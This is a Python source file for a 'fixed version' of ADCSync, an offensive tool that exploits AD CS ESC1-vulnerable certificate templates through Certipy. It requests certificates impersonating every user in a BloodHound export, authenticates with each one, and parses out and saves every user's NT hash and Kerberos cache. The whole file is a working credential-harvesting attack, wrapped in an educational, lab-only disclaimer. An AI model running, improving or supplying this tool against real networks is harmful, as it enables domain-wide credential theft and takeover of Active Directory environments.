"""
ADCSync - Fixed Version
=======================

Original Author: JPG0mez
Original Repository: https://github.com/JPG0mez/ADCSync

Bug Fixes: Osher Jacobs (with assistance from Claude/Anthropic)
Date: February 2026

Changes from Original:
-----------------------
This is a corrected version of ADCSync that fixes three critical bugs discovered
during ADCS ESC1 lab testing:

Bug 1 (Lines 110-126): Hash Parsing
    - Original assumed NT hash on last line with simple ': ' split
    - Certipy actually outputs: "Got hash for 'user@domain': LM:NT"
    - Fixed to search for correct line and extract NT portion only

Bug 2 (Lines 67, 73, 106-114): Domain Lookup
    - Original reused loop variable 'domain' incorrectly
    - Dictionary lookup used wrong key format
    - Fixed to properly reconstruct full UPN and lookup domain

Bug 3: Error Handling
    - Added checks for missing hashes and domains
    - Script now continues processing remaining users on failure
    - Added warning messages instead of silent failures

Educational Purpose:
-------------------
These fixes were made during security research and ADCS detection testing.
The tool is shared for educational purposes to help security researchers understand:
1. Common pitfalls in offensive tool development
2. How to debug security tooling
3. ADCS ESC1 attack chains and detection opportunities

Use responsibly and only in authorized lab environments.

License: Inherits from original repository (if specified)
"""

import json
import os
import shutil
import subprocess
from tqdm import tqdm
from pyfiglet import Figlet
import click
import ipaddress
from ldap3 import Server, Connection, ALL, SIMPLE, SYNC, SUBTREE

# Print stuff
ascii_art = Figlet(font='slant')
print(ascii_art.renderText('ADCSync'))
print("Fixed Version - Osher Jacobs | Original: JPG0mez\n")

if shutil.which("certipy"):
    certipy_client = "certipy"
elif shutil.which("certipy-ad"):
    certipy_client = "certipy-ad"
else:
    print("Certipy not found. Please install Certipy before running ADCSync")
    exit(1)

@click.command()
@click.option('-f', '--file', help='Input User List JSON file from Bloodhound', required=True)
@click.option('-o', '--output', help='NTLM Hash Output file', required=True)
@click.option('-ca', help='Certificate Authority', required=True)
@click.option('-dc-ip', help='IP Address of Domain Controller', required=True)
@click.option('-u', '--user', help='Username', required=True)
@click.option('-p', '--password', help='Password', required=True)
@click.option('-template', help='Template Name vulnerable to ESC1', required=True)
@click.option('-target-ip', help='IP Address of the target machine', required=True)


def main(file, output, ca, dc_ip, user, password, template, target_ip):
    # Read the JSON data from the file
    if not os.path.exists(file):
        print(f"Error: File '{file}' not found.")
        exit(1)

    try:
        with open(file, 'r', encoding='utf-8') as file_obj:
            data = json.load(file_obj)
    except json.JSONDecodeError:
        print(f"Error: The file '{file}' does not contain valid JSON.")
        exit(1)

    # Extract the "name" values
    names = []
    for item in data['data']:
        name = item['Properties']['name']
        names.append(name)

    # Create the "certificates" folder if it doesn't exist
    certificates_folder = 'certificates'
    if not os.path.exists(certificates_folder):
        os.makedirs(certificates_folder)

    # Extract the domain from the username and store it in a dictionary
    # FIX: Use full UPN (name) as key, not constructed string
    usernames_with_domains = {}
    for item in data['data']:
        name = item['Properties']['name']
        domain = name.split('@')[-1]  # Extract the domain from the username
        username = name.split('@')[0].lower()
        usernames_with_domains[name] = domain  # FIX: Store with full UPN as key

    # Execute certipy req command for each name
    print('Grabbing user certs:')
    for name in tqdm(names):
        # Extract the part before the "@" symbol and convert it to lowercase
        username = name.split('@')[0].lower()
        # FIX: Get domain using correct key (full name, not constructed)
        domain = usernames_with_domains.get(name)

        command = [
            certipy_client, 'req', '-u', user, '-p', password, '-target-ip', target_ip,
            '-dc-ip', dc_ip, '-ca', ca, '-template', template, '-upn', name
        ]
        process = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

        # Check the return code and error output of certipy
        if "Could not connect: timed out" in process.stdout:
            print("Could not connect: timed out.")
            exit(1)

        # Move the generated .pfx file to the "certificates" folder if it exists
        for filename in os.listdir('.'):
            if filename.endswith('.pfx') and filename.startswith(username):
                destination = os.path.join(certificates_folder, filename)
                shutil.move(filename, destination)

    # Create the "caches" folder if it doesn't exist
    caches_folder = 'caches'
    if not os.path.exists(caches_folder):
        os.makedirs(caches_folder)

    # Execute command for each .pfx file in the "certificates" folder and record the output
    with open(output, 'a') as output_file:
        for filename in os.listdir(certificates_folder):
            if filename.endswith('.pfx'):
                certificate = os.path.join(certificates_folder, filename)
                username = os.path.splitext(filename.split('@')[0].lower())[0]
                
                # FIX: Reconstruct the full name to get domain properly
                full_name = None
                for name in names:
                    if name.split('@')[0].lower() == username:
                        full_name = name
                        break
                
                if not full_name:
                    print(f"Warning: Could not find domain for {username}, skipping")
                    continue
                
                # Get the domain associated with the username
                domain = usernames_with_domains.get(full_name)

                command = [certipy_client, 'auth', '-pfx', certificate, '-username', username, '-dc-ip', dc_ip]
                process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
                stdout, stderr = process.communicate()

                # FIX: Extract the NT hash from the stdout properly
                # Certipy outputs: "Got hash for 'user@domain': LM:NT"
                output_lines = stdout.strip().split('\n')
                
                # Find line with "Got hash for" and extract NT portion
                hash_line = [line for line in output_lines if 'Got hash for' in line]
                if not hash_line:
                    print(f"Warning: Could not extract hash for {username}, skipping")
                    continue
                
                # Parse: "Got hash for 'user@domain': aad3b435b51404eeaad3b435b51404ee:3c02b6b6fb6b3b17242dc33a31bc011f"
                full_hash = hash_line[0].split(': ')[1]  # Gets "LM:NT"
                nt_hash = full_hash.split(':')[1]  # Gets just NT portion

                # Format the output
                output_format = f'{domain}/{username}::{nt_hash}:::'

                # Print the output to the terminal
                print(output_format)

                # Write the formatted output to the output file
                output_file.write(output_format + '\n')

                # Move the .ccache file to the "caches" folder if it exists
                ccache_file = f'{username}.ccache'
                if os.path.exists(ccache_file):
                    shutil.move(ccache_file, os.path.join(caches_folder, ccache_file))

if __name__ == '__main__':
    main()
